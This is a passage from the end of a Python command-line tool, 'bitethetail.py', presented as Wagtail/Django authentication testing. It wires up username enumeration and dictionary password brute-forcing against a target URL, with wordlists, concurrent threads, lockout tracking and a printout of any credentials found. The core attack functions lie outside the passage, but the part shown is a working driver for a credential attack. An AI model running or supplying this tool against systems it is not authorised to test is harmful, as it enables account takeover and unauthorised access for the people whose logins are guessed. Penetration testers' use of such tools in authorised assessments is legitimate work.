            elif mode == "all" and not results.get("valid_usernames"):
                self._print(
                    f"  {DIM}No valid usernames found during enumeration, "
                    f"testing all {len(brute_targets)} username(s){RESET}"
                )

            brute_results, lockouts = self.brute_force(
                brute_targets, passwords, login_forms
            )
            results["brute_results"] = brute_results
            results["lockouts"] = lockouts

            creds = [r for r in brute_results if r["success"]]
            results["credentials_found"] = [
                {"username": c["username"], "password": c["password"]}
                for c in creds
            ]

        # Build summary
        elapsed = time.time() - self._start_time
        results["summary"] = self._build_summary(results, elapsed)

        return results

    def _build_summary(self, results: dict, elapsed: float) -> dict:
        """Build summary statistics."""
        enum_results = results.get("enumeration_results", [])
        brute_results = results.get("brute_results", [])
        valid_users = results.get("valid_usernames", [])
        creds = results.get("credentials_found", [])
        lockouts = results.get("lockouts", [])

        return {
            "total_requests": self._request_count,
            "elapsed_seconds": round(elapsed, 1),
            "requests_per_second": round(
                self._request_count / max(elapsed, 0.1), 1
            ),
            "usernames_tested": len(
                {r["username"] for r in enum_results}
            ) if enum_results else 0,
            "likely_valid_users": len(valid_users),
            "valid_usernames": valid_users,
            "credentials_tested": len(brute_results),
            "credentials_found": len(creds),
            "lockouts_detected": len(lockouts),
            "login_forms_found": len(
                [f for f in results.get("login_forms", []) if f.get("usable")]
            ),
            "enum_endpoints_found": len(
                [e for e in results.get("enum_endpoints", []) if e.get("usable")]
            ),
        }


# ── Output ────────────────────────────────────────────────────────


def print_banner(url: str, mode: str, threads: int) -> None:
    print()
    print(f"  {BOLD}{MAGENTA}bitethetail.py{RESET}")
    print(f"  {DIM}Wagtail/Django Authentication Testing{RESET}")
    print()
    print(f"  {DIM}Target:{RESET}   {BOLD}{url}{RESET}")
    print(f"  {DIM}Mode:{RESET}     {mode}")
    print(f"  {DIM}Threads:{RESET}  {threads}")


def print_summary(results: dict) -> None:
    summary = results["summary"]

    print()
    print(f"  {BOLD}SUMMARY{RESET}")
    print(f"  {DIM}{'─' * 60}{RESET}")
    print(
        f"  Requests:    {summary['total_requests']:<8}"
        f"Time: {summary['elapsed_seconds']}s     "
        f"Speed: {summary['requests_per_second']} req/s"
    )

    if summary.get("usernames_tested"):
        print()
        print(f"  {BOLD}Enumeration:{RESET}")
        print(f"    Usernames tested:  {summary['usernames_tested']}")
        print(f"    Likely valid:      {summary['likely_valid_users']}")
        if summary.get("valid_usernames"):
            print(
                f"    Valid:             {', '.join(summary['valid_usernames'])}"
            )

    if summary.get("credentials_tested"):
        print()
        print(f"  {BOLD}Brute Force:{RESET}")
        print(f"    Credentials tested:  {summary['credentials_tested']}")
        print(f"    Successful logins:   {summary['credentials_found']}")
        print(f"    Lockouts detected:   {summary['lockouts_detected']}")

    creds = results.get("credentials_found", [])
    if creds:
        print()
        print(f"  {GREEN}{BOLD}CREDENTIALS FOUND:{RESET}")
        for c in creds:
            print(f"    {GREEN}{c['username']} : {c['password']}{RESET}")

    print()


def json_output(results: dict) -> None:
    print(json.dumps(results, indent=2, default=str))


# ── CLI ───────────────────────────────────────────────────────────


def load_wordlist(path: str) -> list[str]:
    """Load a wordlist file (one entry per line)."""
    entries = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                entries.append(line)
    return entries


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Wagtail/Django Authentication Testing Tool",
        epilog=(
            "Modes:\n"
            "  all     Enumerate usernames, then brute-force valid ones (default)\n"
            "  enum    Username enumeration only (login/reset/signup differentials)\n"
            "  brute   Dictionary password attack only\n"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("url", help="Target URL")
    parser.add_argument(
        "--mode",
        choices=["all", "enum", "brute"],
        default="all",
        help="Scan mode (default: all)",
    )
    parser.add_argument(
        "--target-form",
        help="Specific login form path to target (e.g. /accounts/login/)",
    )
    parser.add_argument(
        "--userlist", "-U",
        help="Custom username/email wordlist file",
    )
    parser.add_argument(
        "--passlist", "-P",
        help="Custom password wordlist file",
    )
    parser.add_argument(
        "-u",
        dest="single_user",
        help="Single username to test",
    )
    parser.add_argument(
        "-p",
        dest="single_pass",
        help="Single password to test",
    )
    parser.add_argument(
        "--threads", "-t",
        type=int,
        default=5,
        help="Concurrent threads (default: 5)",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="HTTP timeout in seconds (default: 10)",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.1,
        help="Delay between requests in seconds (default: 0.1)",
    )
    parser.add_argument(
        "--lockout-threshold",
        type=int,
        default=5,
        help="Max failed attempts per user before stopping (default: 5)",
    )
    parser.add_argument(
        "--no-verify",
        action="store_true",
        help="Disable TLS certificate verification",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        dest="json_output",
        help="Output results as JSON",
    )
    parser.add_argument(
        "--output", "-o",
        help="Write results to JSON file",
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Verbose output",
    )

    args = parser.parse_args()

    # Build username list
    usernames = None
    if args.single_user:
        usernames = [args.single_user]
    elif args.userlist:
        usernames = load_wordlist(args.userlist)

    # Build password list
    passwords = None
    if args.single_pass:
        passwords = [args.single_pass]
    elif args.passlist:
        passwords = load_wordlist(args.passlist)

    if not args.json_output:
        print_banner(args.url, args.mode, args.threads)

    scanner = BiteTheTail(
        url=args.url,
        threads=args.threads,
        timeout=args.timeout,
        verify_ssl=not args.no_verify,
        verbose=args.verbose,
        quiet=args.json_output,
        delay=args.delay,
        lockout_threshold=args.lockout_threshold,
    )

    # If target-form specified, override login endpoints
    if args.target_form:
        global LOGIN_ENDPOINTS
        LOGIN_ENDPOINTS = [
            {
                "path": args.target_form,
                "label": "Custom Login Form",
                "username_field": "login",
                "password_field": "password",
            },
        ]

    results = scanner.run(
        mode=args.mode,
        usernames=usernames,
        passwords=passwords,
    )

    if args.json_output:
        json_output(results)
    else:
        print_summary(results)

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2, default=str)
        if not args.json_output:
            print(f"  {DIM}Results written to {args.output}{RESET}\n")


if __name__ == "__main__":
    main()
